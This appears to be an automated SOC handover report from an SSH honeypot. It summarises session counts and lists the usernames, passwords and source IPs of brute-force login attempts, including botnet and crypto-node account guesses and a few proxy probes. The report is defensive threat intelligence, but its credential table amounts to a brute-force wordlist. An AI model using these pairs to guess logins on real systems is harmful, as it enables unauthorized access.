# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-06 |
| **Generated At** | 2026-07-06T08:27:27Z |
| **Shift Time** | 08:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **796** |
| Confirmed Threats | **789** |
| False Positives Filtered | **7** (0.9%) |
| Unique Attacker IPs | **83** |
| Countries of Origin | **21** |
| High Severity Cases | **381** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **415** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **422** |
| Unique Credential Pairs | **348** |
| Unique Usernames | **66** |
| Unique Passwords | **182** |
| Successful Auth Pairs | **386** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 86 |
| `admin` | 31 |
| `345gs5662d34` | 27 |
| `test` | 22 |
| `support` | 18 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 28 |
| `345gs5662d34` | 27 |
| `123456` | 18 |
| `support` | 18 |
| `123` | 16 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 27 |
| `support` | `support` | 18 |
| `root` | `3245gs5662d34` | 12 |
| `admin` | `admin` | 6 |
| `root` | `qwe123$` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user` | `1234567890` | `104.236.53.110` | 2026-07-06T02:56:54 |
| `345gs5662d34` | `345gs5662d34` | `104.236.53.110` | 2026-07-06T02:56:56 |
| `user` | `3245gs5662d34` | `104.236.53.110` | 2026-07-06T02:56:56 |
| `root` | `1` | `91.92.40.204` | 2026-07-06T02:57:17 |
| `root` | `12` | `91.92.40.204` | 2026-07-06T02:58:31 |
| `root` | `123` | `91.92.40.204` | 2026-07-06T02:59:45 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-06T03:00:28 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-06T03:00:28 |
| `root` | `1234` | `91.92.40.204` | 2026-07-06T03:01:00 |
| `root` | `12345` | `91.92.40.204` | 2026-07-06T03:02:15 |
| `root` | `Ar123455` | `45.198.224.120` | 2026-07-06T03:04:18 |
| `root` | `1234567` | `91.92.40.204` | 2026-07-06T03:04:42 |
| `root` | `12345678` | `91.92.40.204` | 2026-07-06T03:05:54 |
| `test` | `12` | `181.188.176.242` | 2026-07-06T03:06:41 |
| `345gs5662d34` | `345gs5662d34` | `181.188.176.242` | 2026-07-06T03:06:44 |
| `test` | `3245gs5662d34` | `181.188.176.242` | 2026-07-06T03:06:46 |
| `root` | `123456789` | `91.92.40.204` | 2026-07-06T03:07:06 |
| `root` | `1234567890` | `91.92.40.204` | 2026-07-06T03:08:17 |
| `root` | `123qwe` | `91.92.40.204` | 2026-07-06T03:09:28 |
| `root` | `123qwerty` | `91.92.40.204` | 2026-07-06T03:10:40 |
| `root` | `21` | `91.92.40.204` | 2026-07-06T03:11:50 |
| `root` | `qwe123$` | `185.242.3.195` | 2026-07-06T03:12:17 |
| `newuser` | `password` | `180.76.105.69` | 2026-07-06T03:12:33 |
| `345gs5662d34` | `345gs5662d34` | `180.76.105.69` | 2026-07-06T03:12:37 |
| `newuser` | `3245gs5662d34` | `180.76.105.69` | 2026-07-06T03:12:39 |
| `root` | `321` | `91.92.40.204` | 2026-07-06T03:12:53 |
| `root` | `4321` | `91.92.40.204` | 2026-07-06T03:13:57 |
| `support` | `support` | `176.53.159.196` | 2026-07-06T03:14:03 |
| `support` | `support` | `10.0.0.73` | 2026-07-06T03:14:18 |
| `root` | `54321` | `91.92.40.204` | 2026-07-06T03:14:58 |
| `root` | `654321` | `91.92.40.204` | 2026-07-06T03:16:00 |
| `root` | `zcadqe` | `45.198.224.120` | 2026-07-06T03:16:23 |
| `root` | `P4ssw0rd` | `91.92.40.204` | 2026-07-06T03:17:00 |
| `root` | `P4ssword` | `91.92.40.204` | 2026-07-06T03:18:01 |
| `root` | `P@ssw0rd` | `91.92.40.204` | 2026-07-06T03:19:01 |
| `root` | `Passw0rd` | `91.92.40.204` | 2026-07-06T03:20:00 |
| `root` | `p4ssword` | `91.92.40.204` | 2026-07-06T03:20:59 |
| `root` | `p@ssw0rd` | `91.92.40.204` | 2026-07-06T03:21:58 |
| `root` | `passw0rd` | `91.92.40.204` | 2026-07-06T03:22:58 |
| `root` | `password` | `91.92.40.204` | 2026-07-06T03:23:57 |
| `root` | `qwerty` | `91.92.40.204` | 2026-07-06T03:24:55 |
| `root` | `root1` | `91.92.40.204` | 2026-07-06T03:26:53 |
| `root` | `root12` | `91.92.40.204` | 2026-07-06T03:27:52 |
| `winston` | `winston` | `45.198.224.120` | 2026-07-06T03:28:21 |
| `root` | `root123` | `91.92.40.204` | 2026-07-06T03:28:51 |
| `root` | `root1234` | `91.92.40.204` | 2026-07-06T03:29:51 |
| `debian` | `p@ssw0rd` | `171.8.40.107` | 2026-07-06T03:29:59 |
| `debian` | `3245gs5662d34` | `171.8.40.107` | 2026-07-06T03:30:12 |
| `root` | `root12345` | `91.92.40.204` | 2026-07-06T03:30:51 |
| `ubuntu` | `AaBbCc123` | `101.126.54.245` | 2026-07-06T03:31:22 |
| `root` | `root123456` | `91.92.40.204` | 2026-07-06T03:31:50 |
| `user` | `13` | `14.103.115.237` | 2026-07-06T03:32:04 |
| `root` | `root1234567` | `91.92.40.204` | 2026-07-06T03:32:49 |
| `root` | `root123456789` | `91.92.40.204` | 2026-07-06T03:33:48 |
| `root` | `root1234567890` | `91.92.40.204` | 2026-07-06T03:34:45 |
| `admin` | `1` | `91.92.40.204` | 2026-07-06T03:35:44 |
| `admin` | `12` | `91.92.40.204` | 2026-07-06T03:36:42 |
| `admin` | `123` | `91.92.40.204` | 2026-07-06T03:37:39 |
| `admin` | `1234` | `91.92.40.204` | 2026-07-06T03:38:37 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-06T03:39:00 |
| `admin` | `12345` | `91.92.40.204` | 2026-07-06T03:39:34 |
| `admin` | `123456` | `91.92.40.204` | 2026-07-06T03:40:32 |
| `solor` | `solor` | `45.198.224.120` | 2026-07-06T03:40:36 |
| `admin` | `1234567` | `91.92.40.204` | 2026-07-06T03:41:29 |
| `admin` | `12345678` | `91.92.40.204` | 2026-07-06T03:42:26 |
| `ubuntu` | `123qweasd` | `1.92.102.164` | 2026-07-06T03:42:51 |
| `345gs5662d34` | `345gs5662d34` | `1.92.102.164` | 2026-07-06T03:42:56 |
| `ubuntu` | `3245gs5662d34` | `1.92.102.164` | 2026-07-06T03:42:58 |
| `admin` | `123456789` | `91.92.40.204` | 2026-07-06T03:43:22 |
| `admin` | `1234567890` | `91.92.40.204` | 2026-07-06T03:44:19 |
| `admin` | `123qwe` | `91.92.40.204` | 2026-07-06T03:45:15 |
| `admin` | `123qwerty` | `91.92.40.204` | 2026-07-06T03:46:12 |
| `admin` | `21` | `91.92.40.204` | 2026-07-06T03:47:07 |
| `admin` | `321` | `91.92.40.204` | 2026-07-06T03:48:03 |
| `admin` | `654321` | `91.92.40.204` | 2026-07-06T03:48:58 |
| `root` | `545454` | `10.0.0.73` | 2026-07-06T03:49:47 |
| `admin` | `Password` | `91.92.40.204` | 2026-07-06T03:49:54 |
| `admin` | `admin` | `91.92.40.204` | 2026-07-06T03:50:51 |
| `admin` | `admin1` | `91.92.40.204` | 2026-07-06T03:51:46 |
| `admin` | `admin12` | `91.92.40.204` | 2026-07-06T03:52:41 |
| `ubuntu` | `q1w2e3r4t5y6` | `45.198.224.120` | 2026-07-06T03:52:48 |
| `root` | `333333` | `10.0.0.73` | 2026-07-06T03:53:08 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-06T03:53:10 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T03:53:11 |
| `root` | `qwe123$` | `10.0.0.73` | 2026-07-06T03:53:24 |
| `admin` | `admin123` | `91.92.40.204` | 2026-07-06T03:53:38 |
| `ftpuser` | `Aa@123456` | `10.0.0.73` | 2026-07-06T03:54:23 |
| `ftpuser` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T03:54:29 |
| `admin` | `pa$w0rd` | `91.92.40.204` | 2026-07-06T03:54:34 |
| `admin` | `passw0rd` | `91.92.40.204` | 2026-07-06T03:55:30 |
| `admin` | `password` | `91.92.40.204` | 2026-07-06T03:56:25 |
| `test` | `Password123` | `10.0.0.73` | 2026-07-06T03:56:27 |
| `test` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T03:56:32 |
| `admin` | `qwerty` | `91.92.40.204` | 2026-07-06T03:57:20 |
| `backup` | `123qwe` | `91.92.40.204` | 2026-07-06T03:58:14 |
| `sftptest` | `sftptest` | `10.0.0.73` | 2026-07-06T03:59:06 |
| `backup` | `54321` | `91.92.40.204` | 2026-07-06T03:59:10 |
| `sftptest` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T03:59:10 |
| `backup` | `backup` | `91.92.40.204` | 2026-07-06T04:00:03 |
| `backup` | `backup1` | `91.92.40.204` | 2026-07-06T04:00:58 |
| `backup` | `backup12` | `91.92.40.204` | 2026-07-06T04:01:53 |
| `backup` | `backup123` | `91.92.40.204` | 2026-07-06T04:02:48 |
| `backup` | `wasd` | `91.92.40.204` | 2026-07-06T04:03:42 |
| `debian` | `123qwe` | `91.92.40.204` | 2026-07-06T04:04:38 |
| `samba` | `123456` | `45.198.224.120` | 2026-07-06T04:04:53 |
| `debian` | `54321` | `91.92.40.204` | 2026-07-06T04:05:32 |
| `debian` | `654321` | `91.92.40.204` | 2026-07-06T04:06:29 |
| `debian` | `debian` | `91.92.40.204` | 2026-07-06T04:07:24 |
| `debian` | `debian12` | `91.92.40.204` | 2026-07-06T04:08:19 |
| `root` | `hadoop2024` | `10.0.0.73` | 2026-07-06T04:09:08 |
| `debian` | `debian123` | `91.92.40.204` | 2026-07-06T04:09:12 |
| `debian` | `pa55word` | `91.92.40.204` | 2026-07-06T04:10:05 |
| `debian` | `qwerty` | `91.92.40.204` | 2026-07-06T04:10:59 |
| `root` | `123ab456` | `10.0.0.73` | 2026-07-06T04:11:29 |
| `deploy` | `1` | `91.92.40.204` | 2026-07-06T04:11:52 |
| `ubuntu` | `6` | `10.0.0.73` | 2026-07-06T04:12:24 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T04:12:30 |
| `deploy` | `12` | `91.92.40.204` | 2026-07-06T04:12:45 |
| `admin` | `admin` | `147.139.136.75` | 2026-07-06T04:12:55 |
| `deploy` | `123` | `91.92.40.204` | 2026-07-06T04:13:37 |
| `deploy` | `1234` | `91.92.40.204` | 2026-07-06T04:14:29 |
| `deploy` | `12345` | `91.92.40.204` | 2026-07-06T04:15:21 |
| `deploy` | `123456` | `91.92.40.204` | 2026-07-06T04:16:12 |
| `sol` | `sol` | `2.57.122.238` | 2026-07-06T04:16:43 |
| `deploy` | `1234567` | `91.92.40.204` | 2026-07-06T04:17:03 |
| `root` | `123456a@` | `45.198.224.120` | 2026-07-06T04:17:04 |
| `deploy` | `12345678` | `91.92.40.204` | 2026-07-06T04:17:55 |
| `solana` | `solana` | `2.57.122.238` | 2026-07-06T04:18:40 |
| `deploy` | `123456789` | `91.92.40.204` | 2026-07-06T04:18:47 |
| `deploy` | `1234567890` | `91.92.40.204` | 2026-07-06T04:19:40 |
| `deploy` | `deploy` | `91.92.40.204` | 2026-07-06T04:20:33 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-07-06T04:20:40 |
| `deploy` | `passw0rd` | `91.92.40.204` | 2026-07-06T04:21:25 |
| `deploy` | `password` | `91.92.40.204` | 2026-07-06T04:22:19 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-07-06T04:22:38 |
| `dev` | `123` | `91.92.40.204` | 2026-07-06T04:23:12 |
| `dev` | `123qwe` | `91.92.40.204` | 2026-07-06T04:24:04 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-07-06T04:24:28 |
| `dev` | `123qwerty` | `91.92.40.204` | 2026-07-06T04:24:55 |
| `dev` | `54321` | `91.92.40.204` | 2026-07-06T04:25:47 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-07-06T04:26:16 |
| `dev` | `dev` | `91.92.40.204` | 2026-07-06T04:26:38 |
| `dev` | `dev1` | `91.92.40.204` | 2026-07-06T04:27:29 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-07-06T04:28:08 |
| `dev` | `dev123` | `91.92.40.204` | 2026-07-06T04:28:21 |
| `dev` | `password` | `91.92.40.204` | 2026-07-06T04:29:13 |
| `root` | `passpass` | `45.198.224.120` | 2026-07-06T04:29:20 |
| `node` | `node` | `2.57.122.238` | 2026-07-06T04:29:57 |
| `dev` | `qwerty` | `91.92.40.204` | 2026-07-06T04:30:03 |
| `developer` | `1` | `91.92.40.204` | 2026-07-06T04:30:54 |
| `node` | `1234` | `2.57.122.238` | 2026-07-06T04:31:45 |
| `developer` | `123` | `91.92.40.204` | 2026-07-06T04:31:45 |
| `developer` | `1234` | `91.92.40.204` | 2026-07-06T04:32:37 |
| `developer` | `12345` | `91.92.40.204` | 2026-07-06T04:33:30 |
| `node` | `123456` | `2.57.122.238` | 2026-07-06T04:33:40 |
| `developer` | `123456` | `91.92.40.204` | 2026-07-06T04:34:22 |
| `developer` | `1234567` | `91.92.40.204` | 2026-07-06T04:35:12 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-07-06T04:35:35 |
| `developer` | `12345678` | `91.92.40.204` | 2026-07-06T04:36:04 |
| `developer` | `123456789` | `91.92.40.204` | 2026-07-06T04:36:56 |
| `eth` | `eth` | `2.57.122.238` | 2026-07-06T04:37:23 |
| `developer` | `1234567890` | `91.92.40.204` | 2026-07-06T04:37:46 |
| `developer` | `developer` | `91.92.40.204` | 2026-07-06T04:38:36 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-07-06T04:39:10 |
| `developer` | `developer1` | `91.92.40.204` | 2026-07-06T04:39:25 |
| `developer` | `developer12` | `91.92.40.204` | 2026-07-06T04:40:14 |
| `developer` | `developer123` | `91.92.40.204` | 2026-07-06T04:41:03 |
| `tron` | `tron` | `2.57.122.238` | 2026-07-06T04:41:03 |
| `ubuntu` | `qw` | `45.198.224.120` | 2026-07-06T04:41:27 |
| `developer` | `password` | `91.92.40.204` | 2026-07-06T04:41:52 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `128.14.236.30` | 2026-07-06T04:42:10 |
| `b'\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03'` | `github.com PGET / HTTP/1.0` | `128.14.236.30` | 2026-07-06T04:42:28 |
| `developer` | `qwerty` | `91.92.40.204` | 2026-07-06T04:42:41 |
| `trx` | `trx` | `2.57.122.238` | 2026-07-06T04:42:52 |
| `docker` | `docker` | `91.92.40.204` | 2026-07-06T04:43:29 |
| `dspace` | `dspace` | `91.92.40.204` | 2026-07-06T04:44:17 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-07-06T04:44:40 |
| `dspace` | `dspace1` | `91.92.40.204` | 2026-07-06T04:45:05 |
| `root` | `1qaz3edc` | `185.242.3.195` | 2026-07-06T04:45:44 |
| `dspace` | `dspace123` | `91.92.40.204` | 2026-07-06T04:45:54 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-07-06T04:46:34 |
| `elastic` | `1` | `91.92.40.204` | 2026-07-06T04:46:41 |
| `elastic` | `1234` | `91.92.40.204` | 2026-07-06T04:47:28 |
| `elastic` | `12345` | `91.92.40.204` | 2026-07-06T04:48:15 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-07-06T04:48:18 |
| `elastic` | `123456` | `91.92.40.204` | 2026-07-06T04:49:05 |
| `solv` | `solv` | `2.57.122.238` | 2026-07-06T04:49:53 |
| `elastic` | `elastic` | `91.92.40.204` | 2026-07-06T04:49:54 |
| `elasticsearch` | `54321` | `91.92.40.204` | 2026-07-06T04:50:42 |
| `solv` | `1234` | `2.57.122.238` | 2026-07-06T04:51:26 |
| `elasticsearch` | `elasticsearch` | `91.92.40.204` | 2026-07-06T04:51:29 |
| `elasticsearch` | `elasticsearch123` | `91.92.40.204` | 2026-07-06T04:52:17 |
| `solv` | `123456` | `2.57.122.238` | 2026-07-06T04:53:01 |
| `es` | `123456` | `91.92.40.204` | 2026-07-06T04:53:02 |
| `ubuntu` | `qwerty7` | `45.198.224.120` | 2026-07-06T04:53:44 |
| `es` | `12345678` | `91.92.40.204` | 2026-07-06T04:53:51 |
| `solv` | `12345678` | `2.57.122.238` | 2026-07-06T04:54:36 |
| `es` | `es` | `91.92.40.204` | 2026-07-06T04:54:41 |
| `ftptest` | `123` | `91.92.40.204` | 2026-07-06T04:55:30 |
| `ftptest` | `123456` | `91.92.40.204` | 2026-07-06T04:56:18 |
| `ftptest` | `12345678` | `91.92.40.204` | 2026-07-06T04:57:06 |
| `ftptest` | `123456789` | `91.92.40.204` | 2026-07-06T04:57:53 |
| `ftptest` | `ftptest` | `91.92.40.204` | 2026-07-06T04:58:40 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-07-06T04:59:18 |
| `ftptest` | `ftptest123` | `91.92.40.204` | 2026-07-06T04:59:24 |
| `ftpuser` | `123qwe` | `91.92.40.204` | 2026-07-06T05:00:10 |
| `validator` | `validator` | `2.57.122.238` | 2026-07-06T05:00:56 |
| `ftpuser` | `654321` | `91.92.40.204` | 2026-07-06T05:00:57 |
| `ftpuser` | `ftpuser` | `91.92.40.204` | 2026-07-06T05:01:44 |
| `ftpuser` | `ftpuser1` | `91.92.40.204` | 2026-07-06T05:02:31 |
| `sol` | `sol123` | `2.57.122.238` | 2026-07-06T05:02:31 |
| `ftpuser` | `ftpuser123` | `91.92.40.204` | 2026-07-06T05:03:18 |
| `ftpuser` | `qwerty` | `91.92.40.204` | 2026-07-06T05:04:05 |
| `sol` | `123` | `2.57.122.238` | 2026-07-06T05:04:07 |
| `gerrit` | `gerrit` | `91.92.40.204` | 2026-07-06T05:04:51 |
| `git` | `1` | `91.92.40.204` | 2026-07-06T05:05:37 |
| `sol` | `12345678` | `2.57.122.238` | 2026-07-06T05:05:45 |
| `root` | `kingofking` | `45.198.224.120` | 2026-07-06T05:06:04 |
| `git` | `123` | `91.92.40.204` | 2026-07-06T05:06:24 |
| `git` | `1234` | `91.92.40.204` | 2026-07-06T05:07:12 |
| `trading` | `trading` | `2.57.122.238` | 2026-07-06T05:07:20 |
| `git` | `12345` | `91.92.40.204` | 2026-07-06T05:08:00 |
| `git` | `123456` | `91.92.40.204` | 2026-07-06T05:08:48 |
| `trader` | `trader` | `2.57.122.238` | 2026-07-06T05:08:52 |
| `git` | `1234567` | `91.92.40.204` | 2026-07-06T05:09:35 |
| `git` | `12345678` | `91.92.40.204` | 2026-07-06T05:10:23 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-07-06T05:10:25 |
| `git` | `123456789` | `91.92.40.204` | 2026-07-06T05:11:12 |
| `git` | `123qwe` | `91.92.40.204` | 2026-07-06T05:11:59 |
| `bot` | `bot` | `2.57.122.238` | 2026-07-06T05:12:02 |
| `git` | `git` | `91.92.40.204` | 2026-07-06T05:12:47 |
| `git` | `git123` | `91.92.40.204` | 2026-07-06T05:13:34 |
| `bot` | `123456` | `2.57.122.238` | 2026-07-06T05:13:37 |
| `CONNECT www.baidu.com:443 HTTP/1.1` | `Host: www.baidu.com:443` | `130.61.23.223` | 2026-07-06T05:14:09 |
| `git` | `passw0rd` | `91.92.40.204` | 2026-07-06T05:14:21 |
| `git` | `password` | `91.92.40.204` | 2026-07-06T05:15:07 |
| `bot` | `12345` | `2.57.122.238` | 2026-07-06T05:15:13 |
| `git` | `qwerty` | `91.92.40.204` | 2026-07-06T05:15:54 |
| `guest` | `123qwe` | `91.92.40.204` | 2026-07-06T05:16:39 |
| `guest` | `guest` | `91.92.40.204` | 2026-07-06T05:17:26 |
| `guest` | `guest1` | `91.92.40.204` | 2026-07-06T05:18:12 |
| `ubuntu` | `qazw1234` | `45.198.224.120` | 2026-07-06T05:18:22 |
| `guest` | `guest123` | `91.92.40.204` | 2026-07-06T05:18:59 |
| `guest` | `qwerty` | `91.92.40.204` | 2026-07-06T05:19:45 |
| `hadoop` | `123` | `91.92.40.204` | 2026-07-06T05:20:33 |
| `hadoop` | `1234` | `91.92.40.204` | 2026-07-06T05:21:20 |
| `hadoop` | `123456` | `91.92.40.204` | 2026-07-06T05:22:07 |
| `admin` | `admin` | `183.130.194.253` | 2026-07-06T05:22:41 |
| `hadoop` | `12345678` | `91.92.40.204` | 2026-07-06T05:22:54 |
| `hadoop` | `123456789` | `91.92.40.204` | 2026-07-06T05:23:39 |
| `hadoop` | `hadoop` | `91.92.40.204` | 2026-07-06T05:24:26 |
| `hadoop` | `hadoop1` | `91.92.40.204` | 2026-07-06T05:25:13 |
| `root` | `qazxsw123` | `2.58.172.185` | 2026-07-06T05:25:34 |
| `hadoop` | `hadoop123` | `91.92.40.204` | 2026-07-06T05:26:00 |
| `root` | `1qaz3edc` | `10.0.0.73` | 2026-07-06T05:26:25 |
| `hadoop` | `password` | `91.92.40.204` | 2026-07-06T05:26:47 |
| `master` | `1` | `91.92.40.204` | 2026-07-06T05:27:34 |
| `mailman` | `namliam` | `110.93.224.226` | 2026-07-06T05:27:41 |
| `345gs5662d34` | `345gs5662d34` | `110.93.224.226` | 2026-07-06T05:27:45 |
| `mailman` | `3245gs5662d34` | `110.93.224.226` | 2026-07-06T05:27:46 |
| `master` | `123` | `91.92.40.204` | 2026-07-06T05:28:22 |
| `root` | `123654abc` | `207.154.250.9` | 2026-07-06T05:28:38 |
| `345gs5662d34` | `345gs5662d34` | `207.154.250.9` | 2026-07-06T05:28:40 |
| `root` | `3245gs5662d34` | `207.154.250.9` | 2026-07-06T05:28:41 |
| `master` | `1234` | `91.92.40.204` | 2026-07-06T05:29:10 |
| `jenkins` | `1qaz321x` | `211.105.129.57` | 2026-07-06T05:29:43 |
| `345gs5662d34` | `345gs5662d34` | `211.105.129.57` | 2026-07-06T05:29:46 |
| `jenkins` | `3245gs5662d34` | `211.105.129.57` | 2026-07-06T05:29:48 |
| `master` | `123456` | `91.92.40.204` | 2026-07-06T05:29:56 |
| `master` | `12345678` | `91.92.40.204` | 2026-07-06T05:30:45 |
| `root` | `Passwd1234` | `45.198.224.120` | 2026-07-06T05:30:55 |
| `master` | `master` | `91.92.40.204` | 2026-07-06T05:31:33 |
| `master` | `master123` | `91.92.40.204` | 2026-07-06T05:32:19 |
| `master` | `qwerty` | `91.92.40.204` | 2026-07-06T05:33:05 |
| `master` | `wasd` | `91.92.40.204` | 2026-07-06T05:33:51 |
| `mysql` | `1` | `91.92.40.204` | 2026-07-06T05:34:37 |
| `mysql` | `123` | `91.92.40.204` | 2026-07-06T05:35:23 |
| `root` | `3210` | `71.174.59.203` | 2026-07-06T05:35:31 |
| `345gs5662d34` | `345gs5662d34` | `71.174.59.203` | 2026-07-06T05:35:33 |
| `root` | `3245gs5662d34` | `71.174.59.203` | 2026-07-06T05:35:33 |
| `mysql` | `1234` | `91.92.40.204` | 2026-07-06T05:36:08 |
| `mysql` | `123456` | `91.92.40.204` | 2026-07-06T05:36:55 |
| `admin` | `cccccccc` | `165.154.254.143` | 2026-07-06T05:37:25 |
| `345gs5662d34` | `345gs5662d34` | `165.154.254.143` | 2026-07-06T05:37:27 |
| `admin` | `3245gs5662d34` | `165.154.254.143` | 2026-07-06T05:37:28 |
| `mysql` | `12345678` | `91.92.40.204` | 2026-07-06T05:37:42 |
| `svnadmin` | `svnadmin` | `135.13.28.35` | 2026-07-06T05:37:44 |
| `345gs5662d34` | `345gs5662d34` | `135.13.28.35` | 2026-07-06T05:37:47 |
| `svnadmin` | `3245gs5662d34` | `135.13.28.35` | 2026-07-06T05:37:49 |
| `mysql` | `mysql` | `91.92.40.204` | 2026-07-06T05:38:27 |
| `mysql` | `mysql1` | `91.92.40.204` | 2026-07-06T05:39:13 |
| `mysql` | `mysql123` | `91.92.40.204` | 2026-07-06T05:39:57 |
| `mysql` | `password` | `91.92.40.204` | 2026-07-06T05:40:43 |
| `odoo` | `odoo` | `91.92.40.204` | 2026-07-06T05:41:29 |
| `odoo` | `odoo1` | `91.92.40.204` | 2026-07-06T05:42:14 |
| `odoo` | `odoo123` | `91.92.40.204` | 2026-07-06T05:43:00 |
| `oracle` | `1` | `91.92.40.204` | 2026-07-06T05:43:45 |
| `root` | `P@ssword!0` | `45.198.224.120` | 2026-07-06T05:43:50 |
| `oracle` | `123` | `91.92.40.204` | 2026-07-06T05:44:30 |
| `oracle` | `1234` | `91.92.40.204` | 2026-07-06T05:45:15 |
| `oracle` | `12345` | `91.92.40.204` | 2026-07-06T05:45:59 |
| `oracle` | `123456` | `91.92.40.204` | 2026-07-06T05:46:43 |
| `oracle` | `12345678` | `91.92.40.204` | 2026-07-06T05:47:26 |
| `oracle` | `123456789` | `91.92.40.204` | 2026-07-06T05:48:11 |
| `oracle` | `oracle` | `91.92.40.204` | 2026-07-06T05:48:55 |
| `oracle` | `oracle1` | `91.92.40.204` | 2026-07-06T05:49:42 |
| `root` | `admin88888` | `122.175.36.92` | 2026-07-06T05:50:27 |
| `oracle` | `oracle123` | `91.92.40.204` | 2026-07-06T05:50:30 |
| `345gs5662d34` | `345gs5662d34` | `122.175.36.92` | 2026-07-06T05:50:32 |
| `root` | `3245gs5662d34` | `122.175.36.92` | 2026-07-06T05:50:34 |
| `oracle` | `p@$word` | `91.92.40.204` | 2026-07-06T05:51:16 |
| `root` | `2qaz@WSX` | `158.180.79.132` | 2026-07-06T05:51:46 |
| `345gs5662d34` | `345gs5662d34` | `158.180.79.132` | 2026-07-06T05:51:50 |
| `root` | `3245gs5662d34` | `158.180.79.132` | 2026-07-06T05:51:51 |
| `oracle` | `password` | `91.92.40.204` | 2026-07-06T05:52:03 |
| `postgres` | `123` | `91.92.40.204` | 2026-07-06T05:52:50 |
| `postgres` | `1234` | `91.92.40.204` | 2026-07-06T05:53:37 |
| `root` | `123456789z` | `46.38.146.46` | 2026-07-06T05:53:54 |
| `345gs5662d34` | `345gs5662d34` | `46.38.146.46` | 2026-07-06T05:53:57 |
| `root` | `3245gs5662d34` | `46.38.146.46` | 2026-07-06T05:53:58 |
| `postgres` | `12345` | `91.92.40.204` | 2026-07-06T05:54:25 |
| `postgres` | `123456` | `91.92.40.204` | 2026-07-06T05:55:12 |
| `ftp1` | `123456789` | `45.70.164.151` | 2026-07-06T05:55:45 |
| `345gs5662d34` | `345gs5662d34` | `45.70.164.151` | 2026-07-06T05:55:49 |
| `ftp1` | `3245gs5662d34` | `45.70.164.151` | 2026-07-06T05:55:50 |
| `postgres` | `1234567` | `91.92.40.204` | 2026-07-06T05:56:00 |
| `root` | `P@ssw0rd2013` | `45.198.224.120` | 2026-07-06T05:56:23 |
| `postgres` | `12345678` | `91.92.40.204` | 2026-07-06T05:56:48 |
| `postgres` | `123456789` | `91.92.40.204` | 2026-07-06T05:57:37 |
| `root` | `8899` | `120.48.181.192` | 2026-07-06T05:57:39 |
| `345gs5662d34` | `345gs5662d34` | `120.48.181.192` | 2026-07-06T05:57:44 |
| `root` | `3245gs5662d34` | `120.48.181.192` | 2026-07-06T05:57:47 |
| `postgres` | `1234567890` | `91.92.40.204` | 2026-07-06T05:58:25 |
| `postgres` | `21` | `91.92.40.204` | 2026-07-06T05:59:12 |
| `admin` | `admin` | `207.175.6.167` | 2026-07-06T05:59:54 |
| `postgres` | `password` | `91.92.40.204` | 2026-07-06T05:59:59 |
| `root` | `P@ssw0rd!` | `38.224.49.7` | 2026-07-06T06:00:22 |
| `345gs5662d34` | `345gs5662d34` | `38.224.49.7` | 2026-07-06T06:00:24 |
| `root` | `3245gs5662d34` | `38.224.49.7` | 2026-07-06T06:00:25 |
| `postgres` | `postgres` | `91.92.40.204` | 2026-07-06T06:00:45 |
| `root` | `3423` | `8.243.73.162` | 2026-07-06T06:01:12 |
| `345gs5662d34` | `345gs5662d34` | `8.243.73.162` | 2026-07-06T06:01:14 |
| `root` | `3245gs5662d34` | `8.243.73.162` | 2026-07-06T06:01:15 |
| `postgres` | `postgres1` | `91.92.40.204` | 2026-07-06T06:01:32 |
| `postgres` | `postgres123` | `91.92.40.204` | 2026-07-06T06:02:19 |
| `postgres` | `qwerty` | `91.92.40.204` | 2026-07-06T06:03:07 |
| `search` | `search` | `91.92.40.204` | 2026-07-06T06:03:50 |
| `server` | `qwerty` | `91.92.40.204` | 2026-07-06T06:04:34 |
| `server` | `server` | `91.92.40.204` | 2026-07-06T06:05:17 |
| `test` | `1` | `91.92.40.204` | 2026-07-06T06:05:59 |
| `test` | `12` | `91.92.40.204` | 2026-07-06T06:06:42 |
| `test` | `123` | `91.92.40.204` | 2026-07-06T06:07:26 |
| `test` | `1234` | `91.92.40.204` | 2026-07-06T06:08:09 |
| `ubuntu` | `qwerty123456` | `45.198.224.120` | 2026-07-06T06:08:31 |
| `test` | `12345` | `91.92.40.204` | 2026-07-06T06:08:53 |
| `test` | `123456` | `91.92.40.204` | 2026-07-06T06:09:38 |
| `test` | `1234567` | `91.92.40.204` | 2026-07-06T06:10:21 |
| `test` | `12345678` | `91.92.40.204` | 2026-07-06T06:11:05 |
| `test` | `123456789` | `91.92.40.204` | 2026-07-06T06:11:47 |
| `test` | `1234567890` | `91.92.40.204` | 2026-07-06T06:12:30 |
